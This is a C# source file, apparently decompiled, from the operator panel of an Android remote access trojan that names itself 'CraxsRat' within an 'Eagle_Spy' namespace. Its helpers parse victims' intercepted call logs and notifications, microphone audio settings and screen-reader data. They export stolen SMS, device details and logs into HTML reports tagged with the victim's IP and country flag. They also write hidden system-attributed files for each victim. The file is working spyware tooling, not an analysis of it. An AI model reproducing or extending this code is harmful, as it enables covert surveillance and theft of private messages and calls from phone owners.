using System;
using System.Collections.Generic;
using System.Data;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Eagle_Spy.My.Resources;
using Eagle_Spy.sockets;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using WinMM;

namespace Eagle_Spy;

[StandardModule]
internal sealed class reso
{
	public static Font FontDrawString = null;

	public static Font f = null;

	public static readonly string MY_Path = Application.StartupPath + "\\";

	public static readonly string res_Path = Application.StartupPath + "\\res";

	public static readonly string res_Path_iconsapps = Application.StartupPath + "\\res\\Icons\\Apps";

	public static readonly string Storepath = Application.StartupPath + "\\res\\Store";

	public static readonly string Junkpath = Application.StartupPath + "\\res\\Lib\\junk.smali";

	public static readonly string CrashsPath = Application.StartupPath + "\\res\\ClientCrashs";

	public static readonly string domen = "plugens.angel.plugens";

	public static readonly string users = "Users";

	public static readonly string nameRAT = "CraxsRat";

	public static StringBuilder maps;

	public static List<object> plug;

	public static string SupportedText;

	public static string SupportedImages;

	public static string SupportedVideo;

	public const int IconsSize = 48;

	public static Bitmap CheckAdmin(bool isadmin)
	{
		if (isadmin)
			return Resources.shieldon;
		return Resources.shieldoff;
	}

	public static string CraxsRatkfvuiorkenfudpajrsnCraxsRatsuhqws(string MSG, Client cli)
	{
		MSG = MSG.Replace("@", "");
		string[] array = MSG.Split('|');
		string text = array[1];
		string text2 = array[2];
		string text3 = "null";
		switch (array[0])
		{
		case "mc":
			text3 = "• [ Missed Call ]";
			break;
		case "oge":
			text3 = "• [ Ended \ud83e\udc81 ]";
			break;
		case "ogs":
			text3 = "• [ Started \ud83e\udc81 ]";
			break;
		case "ene":
			text3 = "• [ Ended \ud83e\udc83 ]";
			break;
		case "ens":
			text3 = "• [ Answered \ud83e\udc83 ]";
			break;
		case "onn":
			text3 = "• [ Received \ud83e\udc83 ]";
			break;
		}
		Data.MainForm.LogCalls(new object[2]
		{
			Codes.ResizeImage(cli.Wallpaper, new Size(45, 45)),
			text3
		});
		if (text.ToLower().Contains("null"))
			text = "Not Found";
		return text3 + "\r\n┃\r\n┗━━➤Number: --> " + text + "\r\n┃\r\n┗━━━➤Date: -> " + text2;
	}

	public static string ChekLink(string lnk)
	{
		if (!lnk.StartsWith("https://") && !lnk.StartsWith("http://"))
			return "https://" + lnk;
		return lnk;
	}

	private static string GetFlag(string ips)
	{
		string text = "";
		Bitmap bitmap = null;
		if (ips.Contains("-"))
		{
			string ipc = ips.Split('-')[1].Trim();
			bitmap = (Bitmap)GetFlagThisIp.ThisIp(ipc);
			if (bitmap == null)
				return "";
			ImageConverter imageConverter = new ImageConverter();
			byte[] inArray = (byte[])imageConverter.ConvertTo(bitmap, typeof(byte[]));
			bitmap.Dispose();
			return "<img src=\"data:Image/ png;base64," + Convert.ToBase64String(inArray) + "\" alt=\"flag\" />";
		}
		return "";
	}

	public static void Directory_Exist(Client clas)
	{
		if (clas != null)
		{
			string folderUSER = clas.FolderUSER;
			if (!Directory.Exists(folderUSER))
				Directory.CreateDirectory(folderUSER);
			Sys(new string[4] { folderUSER, clas.ClientName, clas.ClientAddressIP, clas.Country });
		}
	}

	internal static string CheckTypeScreenRead(string v)
	{
		return v switch
		{
			"5" => "CheckBox:", 
			"4" => "Pic:", 
			"3" => "Pic:", 
			"2" => "Text:", 
			"1" => "Button:", 
			"0" => "textbox:", 
			_ => "", 
		};
	}

	public static string GetVersionClient(string[] k)
	{
		if (k.Length >= 9)
		{
			string left = k[8].Trim();
			if (Operators.CompareString(left, "[CR]", TextCompare: false) != 0)
				return k[8].Trim();
			return "k";
		}
		return "";
	}

	public static void Sys(string[] data)
	{
		try
		{
			string path = data[0] + "\\user.info";
			if (File.Exists(path))
				File.SetAttributes(path, FileAttributes.Normal);
			File.WriteAllText(path, data[1] + "\r\n" + data[2] + "\r\n" + data[3]);
			File.SetAttributes(path, FileAttributes.Hidden | FileAttributes.System);
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
	}

	internal static string[] formatrecords(string thedata)
	{
		return thedata.Split('*');
	}

	internal static object formatPasses(string tHEDATA)
	{
		string[] array = tHEDATA.Split('<');
		return new object[3]
		{
			array[0],
			array[1],
			array[2]
		};
	}

	public static void SAVEit(Array ar)
	{
		string text = $"{SpySettings.DefaultColor_Foreground.R}, {SpySettings.DefaultColor_Foreground.G}, {SpySettings.DefaultColor_Foreground.B}";
		string text2 = $"{SpySettings.DefaultColor_Background.R}, {SpySettings.DefaultColor_Background.G}, {SpySettings.DefaultColor_Background.B}";
		string text3 = $"{SpySettings.DefaultColor_ColorTitles.R}, {SpySettings.DefaultColor_ColorTitles.G}, {SpySettings.DefaultColor_ColorTitles.B}";
		checked
		{
			switch ((string)ar.GetValue(6))
			{
			case "info":
			{
				string text13 = "<!DOCTYPE html>\r\n<html>\r\n<head>\r\n<style>\r\ntable, th, td {\r\n  border: 1px solid rgb(" + text + ");\r\n  border-collapse: collapse;\r\n  text-align: left;\r\n}\r\n  tr.noBorder td {\r\n  border: 0;\r\n}\r\n<style>\r\n::-moz-selection {\r\n  color: rgb(" + text2 + ");\r\n  background-color: rgb(" + text + ");\r\n}\r\n::selection {\r\n  color: rgb(" + text2 + ");\r\n  background-color: rgb(" + text + ");\r\n}\r\n</style>\r\n</head>\r\n \r\n<body style=\"background: rgb(" + text2 + ");font-family:courier;\" >\r\n<table style=\"width:50%\">";
				string text14 = (string)ar.GetValue(3);
				string text15 = (string)ar.GetValue(4);
				string text16 = (string)ar.GetValue(5);
				string text17 = "<h1 style=\"color: rgb(" + text + ");\">" + text14 + "</h1>\r\n<h2 style=\"color: rgb(" + text + ");\">" + ((Operators.CompareString(GetFlag(text15), "", TextCompare: false) == 0) ? "" : (GetFlag(text15) + Strings.Space(1))) + text15.Replace("-", "/ip:") + "</h2>\r\n<p style=\"color: rgb(" + text + ");\">" + text16 + "</p>";
				string text18 = "";
				if (Operators.ConditionalCompareObjectEqual(ar.GetValue(1), "null", TextCompare: false))
					text18 = Conversions.ToString(ar.GetValue(2));
				else
				{
					string text19 = (string)ar.GetValue(1) + "\\";
					string text20 = (string)ar.GetValue(2) + "\\";
					string text21 = (string)ar.GetValue(7);
					if (!Directory.Exists(text19))
						break;
					if (!Directory.Exists(text19 + text20))
						Directory.CreateDirectory(text19 + text20);
					text18 = text19 + text20 + text21;
					if (!File.Exists(text18))
						File.Create(text18).Close();
					if (!File.Exists(text18))
						break;
				}
				using StreamWriter streamWriter2 = new StreamWriter(text18, append: true, Codes.Encoding());
				streamWriter2.Write(text13 + "\r\n");
				streamWriter2.Write(text17 + "\r\n");
				streamWriter2.Write("<tr style=\"color: rgb(" + text2 + "); background: rgb(" + text + ");\">\r\n");
				DataSet dataSet = (DataSet)ar.GetValue(0);
				DataTable dataTable = dataSet.Tables[0];
				streamWriter2.Write("<th>" + dataTable.Columns[0].ColumnName + "</th>\r\n");
				streamWriter2.Write("<th>" + dataTable.Columns[1].ColumnName + "</th>\r\n");
				foreach (object row in dataTable.Rows)
				{
					object objectValue = RuntimeHelpers.GetObjectValue(row);
					streamWriter2.Write("</tr>\r\n");
					if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(objectValue, null, "Item", new object[1] { 1 }, null, null, null), "sub", TextCompare: false))
					{
						streamWriter2.Write("<tr Class=\"noBorder\"; style=\"color: rgb(" + text3 + "); background: rgb(" + text2 + ");\">\r\n");
						streamWriter2.Write(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("<td>", NewLateBinding.LateGet(objectValue, null, "Item", new object[1] { 0 }, null, null, null)), "</td>"), "\r\n"));
						streamWriter2.Write("<td>" + string.Empty + "</td>\r\n");
						streamWriter2.Write("</tr>\r\n");
					}
					else
					{
						streamWriter2.Write("<tr style=\"color: rgb(" + text + "); background: rgb(" + text2 + ");\">\r\n");
						streamWriter2.Write(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("<td>", NewLateBinding.LateGet(objectValue, null, "Item", new object[1] { 0 }, null, null, null)), "</td>"), "\r\n"));
						streamWriter2.Write(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("<td>", NewLateBinding.LateGet(objectValue, null, "Item", new object[1] { 1 }, null, null, null)), "</td>"), "\r\n"));
						streamWriter2.Write("</tr>\r\n");
					}
				}
				streamWriter2.Write("</table>\r\n");
				streamWriter2.Write("</body>\r\n");
				streamWriter2.Write("</html>\r\n");
				streamWriter2.Close();
				break;
			}
			case "sms":
			{
				DataGridView dataGridView2 = (DataGridView)ar.GetValue(0);
				string text22 = "<!DOCTYPE html>\r\n<html>\r\n<head>\r\n<style>\r\ntable, th, td {\r\n  border: 1px solid rgb(" + text + ");\r\n  border-collapse: collapse;\r\n  text-align: left;\r\n}\r\n<style>\r\n::-moz-selection {\r\n  color: rgb(" + text2 + ");\r\n  background-color: rgb(" + text + ");\r\n}\r\n::selection {\r\n  color: rgb(" + text2 + ");\r\n  background-color: rgb(" + text + ");\r\n}\r\n</style>\r\n</head>\r\n \r\n<body style=\"background: rgb(" + text2 + ");font-family:courier;\" >\r\n<table style=\"width:50%\">";
				string text23 = (string)ar.GetValue(3);
				string text24 = (string)ar.GetValue(4);
				string text25 = string.Empty;
				if (dataGridView2.Rows.Count > 0)
					text25 = Conversions.ToString(dataGridView2.Rows[0].Cells[4].Value);
				string text26 = (string)ar.GetValue(5) + Strings.Space(1) + text25;
				string text27 = "<h1 style=\"color: rgb(" + text + ");\">" + text23 + "</h1>\r\n<h2 style=\"color: rgb(" + text + ");\">" + ((Operators.CompareString(GetFlag(text24), "", TextCompare: false) == 0) ? "" : (GetFlag(text24) + Strings.Space(1))) + text24.Replace("-", "/ip:") + "</h2>\r\n<p style=\"color: rgb(" + text + ");\">" + text26 + "</p>";
				string text28 = "";
				if (Operators.ConditionalCompareObjectEqual(ar.GetValue(1), "null", TextCompare: false))
					text28 = Conversions.ToString(ar.GetValue(2));
				else
				{
					string text29 = (string)ar.GetValue(1) + "\\";
					string text30 = (string)ar.GetValue(2) + "\\";
					string text31 = (string)ar.GetValue(7);
					if (!Directory.Exists(text29))
						break;
					if (!Directory.Exists(text29 + text30))
						Directory.CreateDirectory(text29 + text30);
					text28 = text29 + text30 + text31;
					if (!File.Exists(text28))
						File.Create(text28).Close();
					if (!File.Exists(text28))
						break;
				}
				using StreamWriter streamWriter3 = new StreamWriter(text28, append: true, Codes.Encoding());
				streamWriter3.Write(text22 + "\r\n");
				streamWriter3.Write(text27 + "\r\n");
				streamWriter3.Write("<style>\r\ndiv {border: 2px solid gray;padding: 10px;color: rgb(" + text + ");\r\n border-color: rgb(" + text + ")\r\n}\r\n<p style=\"color: rgb(" + text + ");\">\r\n</style>\r\n");
				string headerText = dataGridView2.Columns[0].HeaderText;
				string headerText2 = dataGridView2.Columns[1].HeaderText;
				string headerText3 = dataGridView2.Columns[2].HeaderText;
				int num4 = dataGridView2.Rows.Count - 1;
				for (int l = 0; l <= num4; l++)
				{
					streamWriter3.Write("<div>\r\n");
					streamWriter3.Write(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("<p>" + headerText + ":", dataGridView2.Rows[l].Cells[0].Value), "</p>"), "\r\n"));
					streamWriter3.Write(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("<p>" + headerText2 + ":", dataGridView2.Rows[l].Cells[1].Value), "</p>"), "\r\n"));
					streamWriter3.Write(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("<p>" + headerText3 + ":", dataGridView2.Rows[l].Cells[2].Value), "</p>"), "\r\n"));
					streamWriter3.Write(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("<p>", dataGridView2.Rows[l].Tag), "</p>"), "\r\n"));
					streamWriter3.Write("</div>\r\n");
				}
				streamWriter3.Write("</body>\r\n");
				streamWriter3.Write("</html>\r\n");
				streamWriter3.Close();
				break;
			}
			case "log":
			{
				string text4 = "<!DOCTYPE html>\r\n<html>\r\n<head>\r\n<style>\r\ntable, th, td {\r\n  border: 1px solid rgb(" + text + ");\r\n  border-collapse: collapse;\r\n  text-align: left;\r\n}\r\n<style>\r\n::-moz-selection {\r\n  color: rgb(" + text2 + ");\r\n  background-color: rgb(" + text + ");\r\n}\r\n::selection {\r\n  color: rgb(" + text2 + ");\r\n  background-color: rgb(" + text + ");\r\n}\r\n</style>\r\n</head>\r\n \r\n<body style=\"background: rgb(" + text2 + ");font-family:courier;\" >\r\n<table style=\"width:50%\">";
				string text5 = (string)ar.GetValue(3);
				string text6 = (string)ar.GetValue(4);
				string text7 = (string)ar.GetValue(5);
				string text8 = "<h1 style=\"color: rgb(" + text + ");\">" + text5 + "</h1>\r\n<h2 style=\"color: rgb(" + text + ");\">" + ((Operators.CompareString(GetFlag(text6), "", TextCompare: false) == 0) ? "" : (GetFlag(text6) + Strings.Space(1))) + text6.Replace("-", "/ip:") + "</h2>\r\n<p style=\"color: rgb(" + text + ");\">" + text7 + "</p>";
				string text9 = "";
				if (Operators.ConditionalCompareObjectEqual(ar.GetValue(1), "null", TextCompare: false))
					text9 = Conversions.ToString(ar.GetValue(2));
				else
				{
					string text10 = (string)ar.GetValue(1) + "\\";
					string text11 = (string)ar.GetValue(2) + "\\";
					string text12 = (string)ar.GetValue(7);
					if (!Directory.Exists(text10))
						break;
					if (!Directory.Exists(text10 + text11))
						Directory.CreateDirectory(text10 + text11);
					text9 = text10 + text11 + text12;
					if (!File.Exists(text9))
						File.Create(text9).Close();
					if (!File.Exists(text9))
						break;
				}
				using StreamWriter streamWriter = new StreamWriter(text9, append: true, Codes.Encoding());
				streamWriter.Write(text4 + "\r\n");
				streamWriter.Write(text8 + "\r\n");
				streamWriter.Write("<tr style=\"color: rgb(" + text2 + "); background: rgb(" + text + ");\">\r\n");
				DataGridView dataGridView = (DataGridView)ar.GetValue(0);
				int num = dataGridView.ColumnCount - 1;
				for (int i = 0; i <= num; i++)
				{
					if (dataGridView.Columns[i].GetType().ToString().ToLower()
						.Contains("DataGridViewTextBoxColumn".ToLower()))
						streamWriter.Write("<th>" + dataGridView.Columns[i].HeaderText + "</th>\r\n");
				}
				int num2 = dataGridView.Rows.Count - 1;
				for (int j = 0; j <= num2; j++)
				{
					streamWriter.Write("</tr>\r\n");
					streamWriter.Write("<tr style=\"color: rgb(" + text + "); background: rgb(" + text2 + ");\">\r\n");
					int num3 = dataGridView.ColumnCount - 1;
					for (int k = 0; k <= num3; k++)
					{
						if (dataGridView.Columns[k].GetType().ToString().ToLower()
							.Contains("DataGridViewTextBoxColumn".ToLower()))
							streamWriter.Write(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("<td>", dataGridView.Rows[j].Cells[k].Value), "</td>"), "\r\n"));
					}
					streamWriter.Write("</tr>\r\n");
				}
				streamWriter.Write("</table>\r\n");
				streamWriter.Write("</body>\r\n");
				streamWriter.Write("</html>\r\n");
				streamWriter.Close();
				break;
			}
			}
		}
	}

	internal static void FormatNotifi(string tHEDATA, Client cli)
	{
		checked
		{
			try
			{
				string[] array = tHEDATA.Split('|');
				string text = array[0];
				string text2 = array[1];
				string text3 = array[2] + array[3];
				int num = cli.Notifications.Count() - 1;
				for (int i = 0; i <= num; i++)
				{
					if (cli.Notifications[i] == null)
					{
						cli.Notifications[i] = "\r\n\r\n" + text + "\r\n\r\n" + text2 + "\r\n\r\n" + text3;
						break;
					}
				}
				cli.isnewnotifi = true;
				Data.MainForm.LogNotifi(new object[2]
				{
					Codes.ResizeImage(cli.Wallpaper, new Size(45, 45)),
					text3
				});
			}
			catch (Exception)
			{
				//ProjectData.SetProjectError(projectError);
				//////CraxsAlert.Showinformation("Sorry");
			}
		}
	}

	public static void UPDATEKEY(string key, Collection Col, object[] obj)
	{
		Col.Remove(key);
		Col.Add(obj, key);
	}

	public static object GETKEY(string key, Collection Col)
	{
		object result;
		try
		{
			result = Col[key];
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			result = null;
			//////CraxsAlert.Showinformation("Sorry");
		}
		return result;
	}

	public static string BytesConverter(long bytes)
	{
		long num = 1024L;
		long num2 = 1048576L;
		long num3 = 1073741824L;
		long num4 = 1099511627776L;
		string text = "0 Bytes";
		if (bytes < 1024L)
			text = Conversions.ToString(bytes) + " Bytes";
		else if (bytes > num4)
		{
			text = ((double)bytes / (double)num / (double)num / (double)num / (double)num).ToString("0.00") + " TB";
		}
		else if (bytes > num3)
		{
			text = ((double)bytes / (double)num / (double)num / (double)num).ToString("0.00") + " GB";
		}
		else if (bytes > num2)
		{
			text = ((double)bytes / (double)num / (double)num).ToString("0.00") + " MB";
		}
		else if (bytes >= num)
		{
			text = ((double)bytes / (double)num).ToString("0.00") + " KB";
		}
		return text.ToString();
	}

	public static string Between(string v0, string v1)
	{
		string result;
		try
		{
			result = Regex.Match(maps.ToString(), "(?<=" + Regex.Escape(v0) + ").+?(?=" + Regex.Escape(v1) + ")", RegexOptions.IgnoreCase).Value;
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			result = "-1";
			//////CraxsAlert.Showinformation("Sorry");
		}
		return result;
	}

	public static WaveFormat FormatWave(int v)
	{
		return v switch
		{
			16000 => WaveFormat.Pcm16Khz16BitMono, 
			11025 => WaveFormat.Pcm11Khz16BitMono, 
			8000 => WaveFormat.Pcm8Khz16BitMono, 
			44100 => WaveFormat.Pcm44Khz16BitMono, 
			32000 => WaveFormat.Pcm32Khz16BitMono, 
			22050 => WaveFormat.Pcm22Khz16BitMono, 
			_ => WaveFormat.Pcm8Khz16BitMono, 
		};
	}

	public static string HzString(int v)
	{
		return v switch
		{
			16000 => "16000 (Hz)", 
			11025 => "11025 (Hz)", 
			8000 => "8000 (Hz)", 
			44100 => "44100 (Hz)", 
			32000 => "32000 (Hz)", 
			22050 => "22050 (Hz)", 
			_ => "null", 
		};
	}

	public static int HzInt(string v)
	{
		return v switch
		{
			"44100 (Hz)" => 44100, 
			"32000 (Hz)" => 32000, 
			"22050 (Hz)" => 22050, 
			"16000 (Hz)" => 16000, 
			"11025 (Hz)" => 11025, 
			"8000 (Hz)" => 8000, 
			_ => 8000, 
		};
	}

	public static string Maps_style()
	{
		return SpySettings.STYLE_MAPS;
	}

	public static Bitmap GetBattery(string Clientbat)
	{
		int num = Conversions.ToInteger(Clientbat.Replace("f", ""));
		if (num < 0)
			return Resources.chrg;
		if (num <= 25)
			return Resources.low;
		if (num <= 50)
			return Resources.min;
		if (num <= 80)
			return Resources.Abov_mid;
		return Resources.full;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static string Generals(string num)
	{
		switch (num)
		{
		case "gen-1":
			return "apps";
		case "gen-8":
			return "terminal";
		case "gen-3":
			return "contacts";
		case "gen-2":
			return "calls";
		case "gen-5":
			return "info";
		case "gen-4":
			return "files";
		case "gen-7":
			return "sms";
		default:
		{
			ProjectData.EndApp();
			string result = default(string);
			return result;
		}
		case "gen-6":
			return "microphone";
		}
	}

	public static void NewIcon(string icon, string path)
	{
		string arg = "DefaultIcon";
		try
		{
			RegistryKey registryKey = Registry.ClassesRoot.OpenSubKey($"{path}\\{arg}", writable: true);
			if (registryKey == null)
			{
				Registry.ClassesRoot.CreateSubKey($"{path}\\{arg}").SetValue("", icon);
				RefreshExplorer.EnvRefresh();
			}
			else if (!File.Exists(Conversions.ToString(registryKey.GetValue(""))))
			{
				registryKey.SetValue("", icon);
				RefreshExplorer.EnvRefresh();
			}
		}
		catch (UnauthorizedAccessException projectError)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
	}

	public static Bitmap GetScreen(string v)
	{
		return v.Trim() switch
		{
			"3" => Resources.OFF, 
			"2" => Resources._on, 
			"1" => Resources.OFF_LOCK, 
			"0" => Resources.ON_LOCK, 
			_ => Resources.OFF, 
		};
	}

	private static Bitmap FormatImg(string s, Client Client)
	{
		MemoryStream memoryStream = new MemoryStream(Convert.FromBase64String(s));
		Bitmap srcImage = new Bitmap(Image.FromStream(memoryStream));
		memoryStream.Dispose();
		return new Bitmap(CropToCircle(srcImage));
	}

	public static Image addflag(Image bmPhoto, Image imgPhoto)
	{
		checked
		{
			try
			{
				Bitmap bitmap = new Bitmap(bmPhoto);
				bitmap.SetResolution(imgPhoto.HorizontalResolution, imgPhoto.VerticalResolution);
				Graphics graphics = Graphics.FromImage(bitmap);
				ImageAttributes imageAttributes = new ImageAttributes();
				ColorMap colorMap = new ColorMap();
				colorMap.OldColor = Color.FromArgb(255, 0, 255, 0);
				colorMap.NewColor = Color.FromArgb(0, 0, 0, 0);
				ColorMap[] map = new ColorMap[1] { colorMap };
				imageAttributes.SetRemapTable(map, ColorAdjustType.Bitmap);
				int num = bmPhoto.Width - imgPhoto.Width - 10;
				graphics.DrawImage(imgPhoto, new Rectangle(num + 18, 25, imgPhoto.Width, imgPhoto.Height), 0, 0, imgPhoto.Width, imgPhoto.Height, GraphicsUnit.Pixel, imageAttributes);
				imgPhoto = bitmap;
				graphics.Dispose();
				return imgPhoto;
			}
			catch (Exception)
			{
				//ProjectData.SetProjectError(projectError);
				//////CraxsAlert.Showinformation("Sorry");
			}
			return bmPhoto;
		}
	}

	public static Image CropToCircle(Image srcImage)
	{
		Bitmap bitmap = new Bitmap(srcImage.Width, srcImage.Height);
		using (Graphics graphics = Graphics.FromImage(bitmap))
		{
			GraphicsPath graphicsPath = new GraphicsPath();
			graphics.SmoothingMode = SmoothingMode.AntiAlias;
			graphicsPath.AddEllipse(0, 0, bitmap.Width, bitmap.Height);
			System.Drawing.Region region2 = (graphics.Clip = new System.Drawing.Region(graphicsPath));
			graphics.DrawImage(srcImage, Point.Empty);
			region2.Dispose();
			graphicsPath.Dispose();
		}
		srcImage.Dispose();
		srcImage.Dispose();
		return bitmap;
	}

	public static Bitmap Wallpaper(string v, int xx, int yy, Client Client)
	{
		string s = Resources.wallpaper.ToString().Trim();
		if ((Operators.CompareString(v, "-1", TextCompare: false) != 0) | (Operators.CompareString(v, "", TextCompare: false) == 0))
		{
			byte[] buffer = Convert.FromBase64String(v);
			MemoryStream memoryStream = new MemoryStream(buffer);
			Bitmap bitmap = new Bitmap(Image.FromStream(memoryStream));
			int width = bitmap.Size.Width;
			int height = bitmap.Size.Height;
			if (width == xx && height == yy)
				s = v;
			bitmap.Dispose();
			memoryStream.Dispose();
		}
		return FormatImg(s, Client);
	}

	public static Image GetEllImage(int sel, object[] parm)
	{
		checked
		{
			switch (sel)
			{
			case 1:
			{
				Color color2 = Color.FromArgb(170, SpySettings.DefaultColor_Background.R, SpySettings.DefaultColor_Background.G, SpySettings.DefaultColor_Background.B);
				Pen pen2 = new Pen(color2, 2f);
				using Bitmap bitmap2 = new Bitmap(48, 48);
				using (Graphics graphics2 = Graphics.FromImage(bitmap2))
				{
					graphics2.SmoothingMode = SmoothingMode.AntiAlias;
					using (TextureBrush textureBrush2 = new TextureBrush(bitmap2))
					{
						textureBrush2.TranslateTransform(0f, 0f);
						using (new GraphicsPath())
						{
							using (SolidBrush brush2 = new SolidBrush(getClr()))
								graphics2.FillEllipse(brush2, 4, 4, bitmap2.Width - 12, bitmap2.Height - 12);
							graphics2.DrawEllipse(pen2, 4, 4, bitmap2.Width - 12, bitmap2.Height - 12);
						}
					}
					string text = parm[0].ToString();
					if (Conversions.ToBoolean(Operators.AndObject(Operators.CompareString(text, "null", TextCompare: false) == 0, Operators.NotObject(Operators.CompareObjectEqual(parm[2], null, TextCompare: false)))))
						text = parm[1].ToString();
					string s = Strings.Space(1);
					if (text.Trim().Length > 0)
						s = Conversions.ToString(text[0]);
					Rectangle rectangle = new Rectangle(6, 6, bitmap2.Width - 15, bitmap2.Height - 15);
					StringFormat stringFormat = new StringFormat();
					stringFormat.LineAlignment = StringAlignment.Center;
					stringFormat.Alignment = StringAlignment.Center;
					graphics2.DrawString(s, FontDrawString, new SolidBrush(color2), rectangle, stringFormat);
				}
				return new Bitmap(bitmap2);
			}
			case 0:
			{
				Color color = Color.FromArgb(170, SpySettings.DefaultColor_Background.R, SpySettings.DefaultColor_Background.G, SpySettings.DefaultColor_Background.B);
				Pen pen = new Pen(color, 2f);
				using Bitmap bitmap = new Bitmap(48, 48);
				using (Graphics graphics = Graphics.FromImage(bitmap))
				{
					graphics.SmoothingMode = SmoothingMode.AntiAlias;
					using (TextureBrush textureBrush = new TextureBrush(bitmap))
					{
						textureBrush.TranslateTransform(0f, 0f);
						using (new GraphicsPath())
						{
							using (SolidBrush brush = new SolidBrush(getClr()))
								graphics.FillEllipse(brush, 4, 4, bitmap.Width - 12, bitmap.Height - 12);
							graphics.DrawEllipse(pen, 4, 4, bitmap.Width - 12, bitmap.Height - 12);
						}
					}
					Image image = new Bitmap(parm[0].ToString());
					graphics.DrawImage(RECOLOR(image, Color.FromArgb(190, 190, 190), color), Conversions.ToInteger(parm[1]), Conversions.ToInteger(parm[2]), Conversions.ToInteger(parm[3]), Conversions.ToInteger(parm[4]));
				}
				return new Bitmap(bitmap);
			}
			default:
			{
				Image result = default(Image);
				return result;
			}
			}
		}
	}

	private static Color getClr()
	{
		return SpySettings.DefaultColor_Foreground;
	}

	public static Bitmap RECOLOR(Image image, Color baseColor, Color newColor)
	{
		ColorMatrix colorMatrix = new ColorMatrix(new float[5][]
		{
			new float[5] { 1f, 0f, 0f, 0f, 0f },
			new float[5] { 0f, 1f, 0f, 0f, 0f },
			new float[5] { 0f, 0f, 1f, 0f, 0f },
			new float[5] { 0f, 0f, 0f, 1f, 0f },
			checked(new float[5]
			{
				(float)(newColor.R - baseColor.R) / 255f,
				(float)(newColor.G - baseColor.G) / 255f,
				(float)(newColor.B - baseColor.B) / 255f,
				0f,
				1f
			})
		});
		ImageAttributes imageAttributes = new ImageAttributes();
		imageAttributes.SetColorMatrix(colorMatrix);
		Bitmap bitmap = new Bitmap(image.Width, image.Height);
		using (Graphics graphics = Graphics.FromImage(bitmap))
			graphics.DrawImage(image, new Rectangle(0, 0, image.Width, image.Height), 0, 0, image.Width, image.Height, GraphicsUnit.Pixel, imageAttributes);
		return bitmap;
	}
}
